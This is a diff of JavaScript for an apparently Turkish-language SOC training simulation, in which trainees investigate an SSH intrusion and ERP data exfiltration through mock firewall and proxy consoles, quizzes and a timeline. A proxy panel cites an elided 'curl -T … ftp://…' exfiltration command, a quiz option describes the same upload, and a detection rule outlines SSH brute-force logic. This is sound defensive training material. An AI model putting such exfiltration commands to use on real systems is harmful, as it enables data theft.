+          syncS2Rsys();
+          appendTermScroll([{ text: termStripPromptFromOut(RSYSLOG_COMPOUND_OUT), cls: "out" }]);
+          setMissionFb("Forward yapılandırması mevcut; servis failed — 14 Kas logları SIEM'e ulaşmamış.", "warn");
+          notifyEvidenceReady("ev1");
+        } else {
+          appendTermScroll([{ text: "(Önceki çıktı — geçerli sonuç)\n\n" + termStripPromptFromOut(RSYSLOG_COMPOUND_OUT), cls: "out" }]);
+        }
+        updateMissionDesk();
+        finish();
+        return;
+      }
+      if (S.scene >= 3) {
+        var bad = auditdInvalidSyntax(c);
+        if (bad) {
+          var errText = bad === "pipe"
+            ? "bash: pipe hatası: «systemctl status» çıktısı «which»e aktarılamaz. Komutları ayrı Enter ile veya «;» ile sırayla çalıştırın."
+            : bad === "ve"
+              ? "bash: ve: command not found"
+              : "bash: and: command not found";
+          appendTermScroll([{ text: errText, cls: "err" }]);
+          setMissionFb("İki ayrı kontrol gerekli: servis durumu ve auditctl ikilisi. Pipe veya «ve» ile birleştirmeyin.", "bad");
+          finish();
+          return;
+        }
+        if (auditdCompoundOk(c)) {
+          if (!S.flags.s3_audit_compound) {
+            S.flags.s3_audit_svc = true;
+            S.flags.s3_audit_bin = true;
+            S.flags.s3_audit_compound = true;
+            syncS3Audit();
+            appendTermScroll([{ text: termStripPromptFromOut(AUDITD_COMPOUND_OUT), cls: "out" }]);
+            setMissionFb("Auditd kurulu değil (servis birimi ve auditctl yok).", "warn");
+            showToast("Auditd kontrolü tamamlandı", "ok");
+          } else {
+            appendTermScroll([{ text: "(Önceki çıktı — geçerli sonuç)\n\n" + termStripPromptFromOut(AUDITD_COMPOUND_OUT), cls: "out" }]);
+          }
+          updateMissionDesk();
+          finish();
+          return;
+        }
+      }
+      ["rsyslog_svc", "rsyslog_conf", "auditd_svc", "auditd_bin", "authlog", "sudo"].forEach(function (key) {
+        var tc = TERM_CMDS[key];
+        if (tc.match(c) && S.scene >= tc.minScene) matched = key;
+      });
+      if (!matched) {
+        if (/^help$/.test(c)) {
+          appendTermScroll([{ text: "Bu vakada inceleme alanları (aşamaya göre):\n  · Syslog servisi ve SIEM yönlendirme dosyası\n  · Audit daemon (servis + ikili)\n  · Yerel auth.log (şüpheli IP)\n  · Oturum geçmişi ve sudo kayıtları\nTam komutlar için sağ üstteki 💡 İpucu butonunu kullanın.", cls: "sys" }]);
+        } else {
+          appendTermScroll([{ text: "bash: " + raw + ": command not found", cls: "err" }]);
+          setMissionFb("Komut tanınmadı veya bu aşamada gerekli değil. 💡 İpucu butonuna bakın.", "warn");
+        }
+        finish();
+        return;
+      }
+      var tc = TERM_CMDS[matched];
+      var bodyOut = termStripPromptFromOut(tc.out);
+      if (S.flags[tc.flag]) {
+        appendTermScroll([{ text: "(Önceki çıktı — geçerli sonuç)\n\n" + bodyOut, cls: "out" }]);
+      } else {
+        S.flags[tc.flag] = true;
+        appendTermScroll([{ text: bodyOut, cls: "out" }]);
+        setMissionFb(tc.msg, "warn");
+        showToast(tc.msg, "warn");
+        if (tc.flag === "s4_log" || tc.flag === "s6_view") focusEvidenceBagForActions();
+        if (matched === "authlog") notifyEvidenceReady("ev3");
+        if (matched === "sudo") notifyEvidenceReady("ev5");
+        if (matched === "rsyslog_svc" && !S.flags.s2_rsys_conf) showToast("İlk adım tamam — SIEM forward yapılandırma dosyasını da inceleyin", "warn");
+        if (matched === "rsyslog_conf" && !S.flags.s2_rsys_svc) showToast("Önce syslog servis durumunu doğrulayın", "warn");
+        syncS2Rsys();
+        if (S.flags.s2_rsys_svc && S.flags.s2_rsys_conf) {
+          setMissionFb("Forward yapılandırması mevcut; servis failed — 14 Kas logları SIEM'e ulaşmamış.", "warn");
+          notifyEvidenceReady("ev1");
+        }
+        if (matched === "auditd_svc" && !S.flags.s3_audit_bin) showToast("Servis kontrolü tamam — auditctl ikilisini de doğrulayın", "warn");
+        if (matched === "auditd_bin" && !S.flags.s3_audit_svc) showToast("Önce audit servis durumunu kontrol edin", "warn");
+        syncS3Audit();
+        if (S.flags.s3_audit_svc && S.flags.s3_audit_bin) notifyEvidenceReady("ev2");
+      }
+      updateMissionDesk();
+      finish();
+    }, 280);
+  }
+
+  function showHintContent() {
+    var text = STAGE_HINTS[S.scene];
+    var cfg = STAGE_HINT_POINTS[S.scene];
+    $("hintStageLabel").textContent = "Aşama " + S.scene + "/11 — " + (SCENES[S.scene - 1] || "") +
+      (cfg ? " (ipucu değeri: " + cfg.points + " puan)" : "");
+    $("hintStageText").innerHTML = text;
+    $("hintPolicyBlock").classList.add("hidden");
+    $("hintContentBlock").classList.remove("hidden");
+    $("hintLayer").classList.remove("hidden");
+  }
+
+  function acknowledgeHintPolicy() {
+    var cfg = STAGE_HINT_POINTS[S.scene] || { points: 5, label: "bu aşama" };
+    S.flags.hint_policy_ack = true;
+    applyStageHintPenalty();
+    showHintContent();
+  }
+
+  function showStageHint() {
+    var text = STAGE_HINTS[S.scene];
+    if (!text) {
+      showToast("Bu aşama için ipucu yok.", "warn");
+      return;
+    }
+    var cfg = STAGE_HINT_POINTS[S.scene] || { points: 5, label: "bu aşama" };
+    if (!S.flags.hint_policy_ack) {
+      $("hintPolicyText").textContent =
+        "İpucu, bu aşamadaki soruların tam cevaplarını (komutlar, doğru şıklar, eşleştirmeler) gösterir. " +
+        "Simülasyonda ipucunu ilk kez kullanırken bu bilgilendirme yalnızca bir kez gösterilir. " +
+        "Her aşamada ipucunu ilk kez açtığınızda o aşamanın ipucu değeri kadar toplam puanınızdan düşülür; " +
+        "aynı aşamada ipucuya tekrar basmak ek düşüş yapmaz. Bu aşama ipucu değeri: " + cfg.points + " puan.";
+      $("hintContentBlock").classList.add("hidden");
+      $("hintPolicyBlock").classList.remove("hidden");
+      $("hintLayer").classList.remove("hidden");
+      return;
+    }
+    applyStageHintPenalty();
+    showHintContent();
+  }
+
+  function closeStageHint() {
+    $("hintLayer").classList.add("hidden");
+  }
+
+  function paNavItem(label, on, sub) {
+    return '<span class="pa-nav-item' + (sub ? " sub" : "") + (on ? " on" : "") + '">' + esc(label) + '</span>';
+  }
+
+  function paLogTableHtml() {
+    return '<div class="pa-summary"><b>91</b> traffic log kaydı · Filtre: SSH (tcp/22) · Kaynak <span class="pa-mono">185.220.101.47</span> → Hedef <span class="pa-mono">10.12.4.55</span></div>' +
+      '<table class="pa-table"><thead><tr>' +
+      '<th>Receive Time</th><th>Type</th><th>Device Name</th><th>Source</th><th>Destination</th><th>From Zone</th><th>To Zone</th><th>App</th><th>Action</th>' +
+      '</tr></thead><tbody>' +
+      '<tr><td class="pa-mono">2024/11/14 02:33:14</td><td>TRAFFIC</td><td>FW-PERIMETER-01</td><td class="pa-mono">185.220.101.47</td><td class="pa-mono">10.12.4.55</td><td>untrust</td><td>dmz-prod</td><td>ssh</td><td class="pa-act-allow">allow</td></tr>' +
+      '<tr><td class="pa-mono">2024/11/14 02:33:18</td><td>TRAFFIC</td><td>FW-PERIMETER-01</td><td class="pa-mono">185.220.101.47</td><td class="pa-mono">10.12.4.55</td><td>untrust</td><td>dmz-prod</td><td>ssh</td><td class="pa-act-allow">allow</td></tr>' +
+      '<tr><td class="pa-mono">2024/11/14 02:34:02</td><td>TRAFFIC</td><td>FW-PERIMETER-01</td><td class="pa-mono">185.220.101.47</td><td class="pa-mono">10.12.4.55</td><td>untrust</td><td>dmz-prod</td><td>ssh</td><td class="pa-act-allow">allow</td></tr>' +
+      '<tr><td class="pa-mono">2024/11/14 02:41:01</td><td>TRAFFIC</td><td>FW-PERIMETER-01</td><td class="pa-mono">185.220.101.47</td><td class="pa-mono">10.12.4.55</td><td>untrust</td><td>dmz-prod</td><td>ssh</td><td class="pa-act-allow">allow</td></tr>' +
+      '<tr><td colspan="9" style="background:#f4f5f7;color:#5c6b7a;font-family:inherit">… 87 ek kayıt (tamamı <b>allow</b>, TCP/22)</td></tr>' +
+      '</tbody></table>';
+  }
+
+  function paRulePanelHtml() {
+    return '<div class="pa-rule-panel"><div class="pa-rule-h">Objects › Custom Objects › Detection — DET-SSH-001</div><div class="pa-rule-body"><dl>' +
+      '<dt>Rule ID</dt><dd>DET-SSH-001</dd>' +
+      '<dt>Name</dt><dd>SSH Brute Force — External</dd>' +
+      '<dt>Logic</dt><dd>External src_ip + dst_port 22 + &gt;20 failed attempts / 5 min</dd>' +
+      '<dt>Log sources</dt><dd>Firewall TRAFFIC + <b>auth.log</b> (correlation required)</dd>' +
+      '<dt>Status</dt><dd><span style="color:#0a6e3d;font-weight:700">Enabled</span></dd></dl></div></div>';
+  }
+
+  function renderFirewall(body) {
+    var prevScroll = 0;
+    var prevContent = body.querySelector(".pa-content");
+    if (prevContent) prevScroll = prevContent.scrollTop;
+    var fw = S.flags.s5_fw, q = S.flags.s5_q;
+    var srcVal = esc(S.flags.s5_fw_src || "");
+    var dstVal = esc(S.flags.s5_fw_dst || "");
+    var portVal = esc(S.flags.s5_fw_port || "");
+    var content = fw
+      ? paLogTableHtml() + paRulePanelHtml() +
+        '<div class="pa-foot-actions">' +
+        (hasEv("ev7") ? '<span class="tag ok">✓ Kanıt ev7 eklendi</span>' : '<button type="button" class="btn sm ok" id="btnEv7">+ Firewall kanıtını ekle (ev7)</button>') +
+        (q && !S.flags.q5_wrong ? '<span class="tag ok">✓ Korelasyon analizi tamam</span>' : '') +
+        '</div>' + (q && !S.flags.q5_wrong ? '' : '<div class="pa-mcq">' + renderQ5Inner() + '</div>')
+      : '<div class="pa-empty"><p style="margin-bottom:8px"><b>Traffic Log</b> görünümü</p><p>E-postadaki olay özetindeki kaynak, hedef ve servis bilgilerini filtre alanlarına yazın, ardından <b>Filter Logs</b> çalıştırın.</p></div>';
+
+    body.innerHTML =
+      '<div class="pa-app">' +
+      '<div class="pa-top"><span class="pa-logo">paloalto</span><span class="pa-top-sep">|</span><span class="pa-top-title">Panorama · aktasmakina-panorama-01</span>' +
+      '<div class="pa-top-meta"><span>Device Group: <b>Production-Edge</b></span><span>Logged in: <b>' + esc(S.name || "SOC") + '</b></span></div></div>' +
+      '<div class="pa-shell">' +
+      '<nav class="pa-nav">' +
+      '<div class="pa-nav-h">Panorama</div>' + paNavItem("Dashboard", false) +
+      '<div class="pa-nav-h">Monitor</div>' + paNavItem("Logs", false) + paNavItem("Traffic", true, true) +
+      paNavItem("Threat", false, true) + paNavItem("System", false, true) +
+      '<div class="pa-nav-h">Policies</div>' + paNavItem("Security", false) +
+      '<div class="pa-nav-h">Objects</div>' + paNavItem("Custom Objects", false) +
+      '</nav>' +
+      '<div class="pa-main">' +
+      '<div class="pa-breadcrumb">Monitor › <b>Logs</b> › Traffic · FW-PERIMETER-01 · Last 7 days</div>' +
+      '<div class="pa-toolbar">' +
+      '<div class="pa-log-tabs"><span class="pa-log-tab on">Traffic</span><span class="pa-log-tab">Threat</span><span class="pa-log-tab">URL</span><span class="pa-log-tab">WildFire</span></div>' +
+      '<div class="pa-qrow">' +
+      '<div class="pa-qfield"><label>Source Address</label><input type="text" id="paSrc" placeholder="Saldırgan kaynak IP" value="' + srcVal + '" /></div>' +
+      '<div class="pa-qfield"><label>Destination Address</label><input type="text" id="paDst" placeholder="Hedef sunucu IP" value="' + dstVal + '" /></div>' +
+      '<div class="pa-qfield"><label>Destination Port</label><input type="text" id="paPort" placeholder="Servis portu" value="' + portVal + '" /></div>' +
+      (fw ? '' : '<button type="button" class="pa-btn-run" id="btnFw">Filter Logs</button>') +
+      '</div></div>' +
+      '<div class="pa-content">' + content + '</div>' +
+      '<div class="pa-statusbar"><span>Log Collector: <span class="ok">Connected</span></span><span>Last sync: Today 09:14</span><span>Managed devices: 12</span></div>' +
+      '</div></div></div>';
+    ["paSrc", "paDst", "paPort"].forEach(function (id, i) {
+      var inp = $(id);
+      var keys = ["s5_fw_src", "s5_fw_dst", "s5_fw_port"];
+      if (inp) inp.oninput = function () { S.flags[keys[i]] = inp.value; };
+    });
+    if (!fw) {
+      var b = $("btnFw");
+      if (b) b.onclick = function () {
+        var src = $("paSrc") ? $("paSrc").value : "";
+        var dst = $("paDst") ? $("paDst").value : "";
+        var port = $("paPort") ? $("paPort").value : "";
+        S.flags.s5_fw_src = src;
+        S.flags.s5_fw_dst = dst;
+        S.flags.s5_fw_port = port;
+        if (!isValidFwFilter(src, dst, port)) {
+          setMissionFb("Filtreler e-postadaki saldırgan, hedef ve SSH servis bilgisiyle uyumlu olmalı.", "bad");
+          showToast("Kaynak, hedef ve port filtrelerini e-postayla karşılaştırın", "warn");
+          return;
+        }
+        S.flags.s5_fw = true;
+        setMissionFb("Traffic logları yüklendi — kanıt ve korelasyon sorusuna geçin.", "ok");
+        refreshWindow("firewall");
+        updateMissionDesk();
+      };
+    }
+    if (fw && !hasEv("ev7")) {
+      var e7 = $("btnEv7");
+      if (e7) e7.onclick = function () {
+        addEvidence("ev7");
+        refreshWindow("firewall");
+        updateMissionDesk();
+      };
+    }
+    if (fw && (!q || S.flags.q5_wrong)) bindQ5();
+    var newContent = body.querySelector(".pa-content");
+    if (newContent && prevScroll > 0) {
+      newContent.scrollTop = prevScroll;
+      requestAnimationFrame(function () { newContent.scrollTop = prevScroll; });
+    }
+  }
+
+  function renderQ5Inner() {
+    var locked = S.flags.q5_locked && S.flags.q5_wrong;
+    return '<h4>Kural ve firewall logları mevcut. SIEM alarmı neden tetiklenmedi?</h4><div class="choices" id="q5">' +
+      ['A) Firewall logları SIEM\'e hiç gitmiyor', 'B) Kural auth.log + firewall birlikte istiyor; auth.log SIEM\'e ulaşmadığı için korelasyon tamamlanamıyor',
+       'C) Saldırgan IP whitelist\'te', 'D) Kural devre dışı'].map(function (t, i) {
+        return '<button type="button" class="choice" data-i="' + i + '">' + esc(t) + '</button>';
+      }).join("") + "</div>" + (locked ? quizExplainBlock("q5") : "");
+  }
+
+  function renderQ5() {
+    return '<div class="pa-mcq">' + renderQ5Inner() + '</div>';
+  }
+
+  function bindQ5() {
+    bindQuiz("q5", function () {
+      if (!hasEv("ev4")) addEvidence("ev4");
+      setMissionFb("Korelasyon analizi kaydedildi.", "ok");
+    }, function () { refreshWindow("firewall"); });
+  }
+
+  function bcNavItem(label, on, sub) {
+    return '<span class="bc-nav-item' + (sub ? " sub" : "") + (on ? " on" : "") + '">' + esc(label) + '</span>';
+  }
+
+  function renderProxy(body) {
+    var p = S.flags.s7_proxy;
+    var resultBlock = p
+      ? '<div class="bc-query-tags">' +
+        '<span class="bc-tag">Access log: main</span>' +
+        '<span class="bc-tag">c-ip=10.12.4.55</span>' +
+        '<span class="bc-tag">2024/11/14 02:44–02:46</span>' +
+        '<span class="bc-tag">Format: bcreportermain_v1 (ELFF)</span></div>' +
+        '<div class="bc-zero"><b>0</b><span>eşleşen access log kaydı (Log Tail sorgusu)</span></div>' +
+        '<table class="bc-table"><thead><tr>' +
+        '<th>Time</th><th>c-ip</th><th>cs-username</th><th>cs-method</th><th>cs-uri</th><th>s-action</th><th>sc-status</th><th>sc-bytes</th>' +
+        '</tr></thead><tbody><tr><td colspan="8" style="text-align:center;padding:16px;font-family:inherit;color:#5a6f82;background:#fafbfc">No matching entries for filter</td></tr></tbody></table>' +
+        '<div class="bc-insight"><b>SOC yorumu:</b> ERP-PROD-04 (10.12.4.55) üretim segmentinde proxy <b>bypass</b> politikası tanımlı; sunucu trafiği Edge SWG üzerinden geçmiyor. Terminalde görülen <code style="font-size:10px">curl -T … ftp://…</code> exfiltration akışı proxy access loglarında görünmez — firewall outbound izni açık kalmış olabilir.</div>' +
+        '<div class="bc-ev-row">' + (hasEv("ev6") ? '<span class="tag ok">✓ Kanıt ev6 eklendi</span>' : '<button type="button" class="btn sm ok" id="btnEv6">+ Kanıta ekle (Görünürlük #5)</button>') + '</div>'
+      : '<div class="bc-empty"><p><b>Access Log Tail</b> henüz çalıştırılmadı.</p><p>Client IP filtresini doğrulayın ve <b>Show Log Tail</b> ile sorguyu başlatın.</p></div>';
+
+    body.innerHTML =
+      '<div class="bc-app">' +
+      '<div class="bc-top"><span class="bc-logo">Blue Coat<em>ProxySG</em></span><span style="opacity:.5">|</span>' +
+      '<span style="font-size:10px">Edge SWG · PROXY-CORP-01 · SGOS 7.3</span>' +
+      '<div class="bc-top-meta"><span>Serial: <b>BCG12345678</b></span><span>Admin: <b>' + esc(S.name || "SOC") + '</b></span></div></div>' +
+      '<div class="bc-shell">' +
+      '<nav class="bc-nav">' +
+      '<div class="bc-nav-h">Console</div>' + bcNavItem("Home", false) +
+      '<div class="bc-nav-h">Statistics</div>' + bcNavItem("Traffic Mix", false) + bcNavItem("Active Sessions", false) +
+      '<div class="bc-nav-h">Reports</div>' + bcNavItem("Access Logging", true) + bcNavItem("Event Logging", false, true) +
+      bcNavItem("Log Tail Settings", false, true) +
+      '<div class="bc-nav-h">Configuration</div>' + bcNavItem("Policy", false) + bcNavItem("Services", false) +
+      '</nav>' +
+      '<div class="bc-main">' +
+      '<div class="bc-page-h"><h2>Access Logging</h2><p>Reports › Access Logging — View or tail access logs (ELFF). Real-time log tail opens in-page for SOC correlation.</p></div>' +
+      '<div class="bc-panel">' +
+      '<div class="bc-panel-h">Log query — Access log tail</div>' +
+      '<div class="bc-form">' +
+      '<div class="bc-field"><label>Access Log</label><select disabled><option selected>main — default access log</option></select></div>' +
+      '<div class="bc-field"><label>Log Tail Refresh</label><select disabled><option selected>Manual (none)</option><option>5 seconds</option></select></div>' +
+      '<div class="bc-field"><label>Client IP (c-ip)</label><input type="text" value="10.12.4.55" readonly /></div>' +
+      '<div class="bc-field"><label>Time range (UTC)</label><input type="text" value="2024-11-14 02:44:00 — 02:46:59" readonly /></div>' +
+      '</div>' +
+      '<div class="bc-actions">' +
+      (p ? '<span class="bc-btn-sec" style="cursor:default;opacity:.7">Show Log Tail ✓</span>' : '<button type="button" class="bc-btn-primary" id="btnProxy">Show Log Tail</button>') +
+      '<button type="button" class="bc-btn-sec" disabled title="Simülasyon">Download Log Tail</button>' +
+      '<button type="button" class="bc-btn-sec" disabled>Clear filter</button>' +
+      '</div></div>' +
+      '<div class="bc-content">' + resultBlock + '</div>' +
+      '<div class="bc-foot"><span>Access logging: <span class="on">Enabled</span></span><span>Upload client: SIEM-FWD (idle)</span><span>Policy: Production-Bypass-ERP</span></div>' +
+      '</div></div></div>';
+    if (!p) { var b = $("btnProxy"); if (b) b.onclick = function () { S.flags.s7_proxy = true; refreshWindow("proxy"); updateMissionDesk(); }; }
+    if (p && !hasEv("ev6")) { var e6 = $("btnEv6"); if (e6) e6.onclick = function () { addEvidence("ev6"); S.flags.s7_done = true; refreshWindow("proxy"); updateMissionDesk(); }; }
+  }
+
+  function renderEvidence(body) {
+    var html = '<div style="padding:12px"><h3 style="font-size:14px;margin-bottom:10px">🎒 Kanıt Çantası</h3>';
+    if (!S.evidence.length) html += '<p style="color:var(--muted);font-size:11px">Kanıtlar analiz ilerledikçe burada birikecek.</p>';
+    else html += S.evidence.map(function (id) {
+      var e = EVIDENCE_DEF[id];
+      return '<div class="ev-card ' + (e.type || "") + '"><b>' + esc(e.title) + '</b>' + esc(e.text) + '</div>';
+    }).join("");
+    var addBtns = [];
+    if (S.flags.s2_rsys && !hasEv("ev1")) addBtns.push({ id: "ev1", score: 8, msg: "Log forwarder çalışmıyor." });
+    if (S.flags.s3_audit && !hasEv("ev2")) addBtns.push({ id: "ev2", score: 8, msg: "Auditd eksik." });
+    if (S.flags.s4_log && !hasEv("ev3")) addBtns.push({ id: "ev3", score: 10, msg: "auth.log kanıtı." });
+    if (S.flags.s6_q && !hasEv("ev5")) addBtns.push({ id: "ev5", score: 12, msg: "Exfiltration kanıtı." });
+    if (addBtns.length) {
+      html += '<div style="margin-top:12px"><h4 style="font-size:11px;color:var(--muted);margin-bottom:6px">Eklenebilir kanıtlar</h4>';
+      addBtns.forEach(function (a) {
+        html += '<button type="button" class="btn sm ok" style="margin:0 4px 4px 0" data-ev="' + a.id + '" data-sc="' + a.score + '">+ ' + esc(EVIDENCE_DEF[a.id].title) + '</button>';
+      });
+      html += '</div>';
+    }
+    if (S.flags.s3_audit && (!S.flags.s3_q || S.flags.q3_wrong)) html += renderQ3();
+    if (S.flags.s6_view && (!S.flags.s6_q || S.flags.q6_wrong)) html += renderQ6();
+    html += '</div>';
+    body.innerHTML = html;
+    body.querySelectorAll("[data-ev]").forEach(function (btn) {
+      btn.onclick = function () {
+        var id = btn.getAttribute("data-ev");
+        if (addEvidence(id)) { setMissionFb("Kanıt eklendi.", "ok"); updateMissionDesk(); refreshWindow("evidence"); }
+      };
+    });
+    if (S.flags.s3_audit && (!S.flags.s3_q || S.flags.q3_wrong)) bindQ3();
+    if (S.flags.s6_view && (!S.flags.s6_q || S.flags.q6_wrong)) bindQ6();
+  }
+
+  function renderQ3() {
+    var locked = S.flags.q3_locked && S.flags.q3_wrong;
+    return '<div class="card" style="margin-top:10px"><h4>Auditd kurulu olsaydı hangi davranışları daha iyi görebilirdik?</h4><div class="choices" id="q3">' +
+      ['A) Sadece firewall trafiği', 'B) /opt/erp/data/ erişimleri, sudo/root, dosya R/W, execve', 'C) E-posta trafiği', 'D) DNS sorguları'].map(function (t, i) {
+        return '<button type="button" class="choice" data-i="' + i + '">' + esc(t) + '</button>';
+      }).join("") + "</div>" + (locked ? quizExplainBlock("q3") : "") + "</div>";
+  }
+
+  function bindQ3() {
+    bindQuiz("q3", function () {
+      setMissionFb("Auditd değerlendirmesi kaydedildi.", "ok");
+    }, function () { refreshWindow("evidence"); });
+  }
+
+  function renderQ6() {
+    var locked = S.flags.q6_locked && S.flags.q6_wrong;
+    return '<div class="card" style="margin-top:10px"><h4>Son satır hangi davranışı gösteriyor?</h4><div class="choices" id="q6">' +
+      ['A) Yerel yedekleme rutini', 'B) curl ile ERP verisinin dış FTP hedefine yüklenmesi — exfiltration', 'C) Sistem güncellemesi', 'D) Log rotation'].map(function (t, i) {
+        return '<button type="button" class="choice" data-i="' + i + '">' + esc(t) + '</button>';
+      }).join("") + "</div>" + (locked ? quizExplainBlock("q6") : "") + "</div>";
+  }
+
+  function bindQ6() {
+    bindQuiz("q6", function () {
+      setMissionFb("Davranış değerlendirmesi kaydedildi.", "ok");
+    }, function () { refreshWindow("evidence"); });
+  }
+
+  function renderTimeline(body) {
+    S.flags.tl_order = S.flags.tl_order || [];
+    var order = S.flags.tl_order;
+    var locked = S.flags.tl_locked;
+    var displayOrder = getTimelinePoolOrder();
+    body.innerHTML = '<div style="padding:12px"><h3 style="font-size:14px;margin-bottom:8px">📅 Olay Zaman Çizelgesi</h3>' +
+      '<p style="font-size:11px;color:var(--muted);margin-bottom:10px">Olayları kronolojik sıraya göre seçin (1→7). Seçili olana tekrar tıklayarak kaldırın; alttakiler bir sıra yukarı kayar.</p>' +
+      (S.flags.s8_done && !S.flags.tl_wrong ? '<p class="tag ok" style="margin-bottom:8px">✓ Zaman çizelgesi tamamlandı</p>' : "") +
+      '<div class="tl-result"><h4 style="font-size:11px;color:var(--muted);margin-bottom:6px">Seçim sıranız</h4>' +
+      (order.length ? order.map(function (id, i) {
+        var e = TL_EVENTS.find(function (x) { return x.id === id; });
+        return '<div class="tl-slot">' + (i + 1) + '. ' + esc(e.text) + '</div>';
+      }).join("") : '<div class="tl-slot" style="color:var(--muted)">Henüz seçim yok</div>') + '</div>' +
+      '<div id="tlPool" style="margin-top:10px">' + displayOrder.map(function (id) {
+        var e = TL_EVENTS.find(function (x) { return x.id === id; });
+        var pos = order.indexOf(id);
+        var picked = pos >= 0;
+        return '<div class="tl-item' + (locked ? " locked" : "") + (picked ? " tl-picked" : "") + '" data-id="' + e.id + '">' +
+          '<span class="tl-pick-num' + (picked ? "" : " empty") + '">' + (picked ? String(pos + 1) : "·") + '</span>' +
+          '<span class="tl-pick-text">' + esc(e.text) + '</span></div>';
+      }).join("") + '</div>' +
+      '<button type="button" class="btn sm" id="btnTlReset" style="margin-top:8px"' + (locked ? " disabled" : "") + '>Sıfırla</button>' +
+      '<button type="button" class="btn sm ok" id="btnTlCheck" style="margin-top:8px;margin-left:6px"' + (locked ? " disabled" : "") + '>Doğrula</button>' +
+      (S.flags.tl_show_explain ? timelineExplainBlock() : "") + "</div>";
+    if (!locked) {
+      body.querySelectorAll("#tlPool .tl-item").forEach(function (el) {
+        el.onclick = function () { toggleTimelinePick(el.getAttribute("data-id")); };
+      });
+      var btnReset = body.querySelector("#btnTlReset");
+      if (btnReset) btnReset.onclick = function () {
+        S.flags.tl_order = [];
+        S.flags.tl_show_explain = false;
+        S.flags.tl_pool_shuffle = shuffleIds(TL_EVENTS.map(function (e) { return e.id; }));
+        refreshWindow("timeline");
+      };
+      var btnCheck = body.querySelector("#btnTlCheck");
+      if (btnCheck) btnCheck.onclick = function () {
+        if (S.flags.tl_locked) return;
+        var cur = S.flags.tl_order || [];
+        var ok = cur.length === TL_ORDER.length && cur.every(function (v, i) { return v === TL_ORDER[i]; });
+        S.flags.tl_locked = true;
+        S.flags.s8_done = true;
+        if (ok) {
+          S.flags.tl_wrong = false;
+          S.flags.tl_show_explain = false;
+          if (!hasEv("ev8")) addEvidence("ev8");
+          setMissionFb("Zaman çizelgesi doğru.", "ok");
+        } else {
+          S.flags.tl_wrong = true;
+          S.flags.tl_show_explain = true;
+          applyWrongAnswerPenalty("timeline");
+          clearMissionFbForWrongQuestion();
+        }
+        updateMissionDesk();
+        refreshWindow("timeline");
+      };
+    }
+  }
+
+  function renderIrPortal(body) {
+    var tab = S.irTab;
+    body.innerHTML = '<div class="ir-app"><div class="ir-bar">📋 IR Playbook Portal — AktaşMakina</div>' +
+      '<div class="ir-tabs">' +
+      ['gap', 'prio', 'brief'].map(function (t) {
+        var labels = { gap: "Görünürlük Tablosu", prio: "Risk Önceliklendirme", brief: "SOC Lead Briefing" };
+        return '<button type="button" class="ir-tab' + (tab === t ? " on" : "") + '" data-tab="' + t + '">' + labels[t] + '</button>';
+      }).join("") + '</div><div class="ir-body" id="irBody"></div></div>';
+    body.querySelectorAll(".ir-tab").forEach(function (btn) {
+      btn.onclick = function () { S.irTab = btn.getAttribute("data-tab"); refreshWindow("irportal"); };
+    });
+    var ib = $("irBody");
+    if (tab === "gap") renderGapTab(ib);
+    else if (tab === "prio") renderPrioTab(ib);
+    else renderBriefTab(ib);
+  }
+
+  function renderGapTab(el) {
+    S.flags.gap_ans = S.flags.gap_ans || {};
+    var locked = S.flags.gap_locked;
+    el.innerHTML = '<p style="font-size:11px;color:var(--muted);margin-bottom:10px">Her satır için «Hangi aşamayı kör yaptı» seçin</p>' +
+      (S.flags.s9_done && !S.flags.gap_wrong ? '<p class="tag ok" style="margin-bottom:8px">✓ Tablo doğrulandı</p>' : "") +
+      '<div class="match-grid"><div class="match-row" style="font-weight:600;color:var(--muted)"><span>Boşluk</span><span>Neden</span><span>Kör etti</span></div>' +
+      GAP_ROWS.map(function (row, i) {
+        var opts = GAP_ROWS.map(function (r) { return r.blind; });
+        var uniq = opts.filter(function (v, j) { return opts.indexOf(v) === j; });
+        return '<div class="match-row"><span>' + esc(row.gap) + '</span><span style="color:var(--muted)">' + esc(row.cause) + '</span>' +
+          '<select data-row="' + i + '"' + (locked ? " disabled" : "") + '><option value="">— seç —</option>' + uniq.map(function (o) {
+            return '<option value="' + esc(o) + '"' + (S.flags.gap_ans[i] === o ? " selected" : "") + '>' + esc(o) + '</option>';
+          }).join("") + '</select></div>';
+      }).join("") + '</div><button type="button" class="btn" id="btnGapCheck" style="margin-top:12px"' + (locked ? " disabled" : "") + '>Tabloyu doğrula</button>' +
+      (S.flags.gap_show_explain ? gapExplainBlock() : "");
+    if (!locked) {
+      el.querySelectorAll("select").forEach(function (sel) {
+        sel.onchange = function () { S.flags.gap_ans[parseInt(sel.getAttribute("data-row"), 10)] = sel.value; };
+      });
+      var btnGap = el.querySelector("#btnGapCheck");
+      if (btnGap) {
+        btnGap.onclick = function () {
+          if (S.flags.gap_locked) return;
+          var all = GAP_ROWS.every(function (row, i) { return S.flags.gap_ans[i] === row.blind; });
+          S.flags.gap_locked = true;
+          S.flags.s9_done = true;
+          if (all) {
+            S.flags.gap_wrong = false;
+            S.flags.gap_show_explain = false;
+          setMissionFb("Görünürlük boşlukları doğru eşleştirildi.", "ok");
+        } else {
+          S.flags.gap_wrong = true;
+          S.flags.gap_show_explain = true;
+          applyWrongAnswerPenalty("gap");
+          clearMissionFbForWrongQuestion();
+        }
+          updateMissionDesk();
+          if (S.windows.irportal) refreshWindow("irportal");
+        };
+      }
+    }
+  }
+
+  var prioDragId = null;
+
+  function bindPrioDragDrop(root) {
+    if (S.flags.prio_locked) return;
+    root.querySelectorAll(".prio-item").forEach(function (item) {
+      item.setAttribute("draggable", "true");
+      item.addEventListener("dragstart", function (e) {
+        prioDragId = item.getAttribute("data-id");
+        e.dataTransfer.setData("text/plain", prioDragId);
+        e.dataTransfer.effectAllowed = "move";
+        item.classList.add("dragging");
+      });
+      item.addEventListener("dragend", function () {
+        item.classList.remove("dragging");
+        root.querySelectorAll(".drag-over").forEach(function (z) { z.classList.remove("drag-over"); });
+        prioDragId = null;
+      });
+    });
+    root.querySelectorAll(".prio-col, .prio-pool").forEach(function (zone) {
+      zone.addEventListener("dragover", function (e) {
+        e.preventDefault();
+        e.dataTransfer.dropEffect = "move";
+        zone.classList.add("drag-over");
+      });
+      zone.addEventListener("dragleave", function (e) {
+        if (!zone.contains(e.relatedTarget)) zone.classList.remove("drag-over");
+      });
+      zone.addEventListener("drop", function (e) {
+        e.preventDefault();
+        zone.classList.remove("drag-over");
+        var id = e.dataTransfer.getData("text/plain") || prioDragId;
+        if (!id) return;
+        var cat = zone.getAttribute("data-cat");
+        if (cat) S.flags.prio[id] = cat;
+        else delete S.flags.prio[id];
+        refreshWindow("irportal");
+      });
+    });
+  }
+
